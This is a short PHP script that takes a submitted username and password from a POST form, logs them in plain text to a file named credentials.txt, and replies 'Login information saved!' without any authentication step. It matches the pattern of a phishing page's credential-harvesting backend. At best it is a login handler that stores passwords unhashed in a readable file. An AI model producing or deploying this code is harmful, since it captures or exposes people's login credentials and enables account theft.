<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Sanitize inputs
    $username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    // File to store credentials
    $file = 'credentials.txt';

    // Prepare the data to be written
    $data = "Username: $username, Password: $password\n";

    // Write the data to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    echo "Login information saved!";
} else {
    echo "Invalid request method.";
}
?>
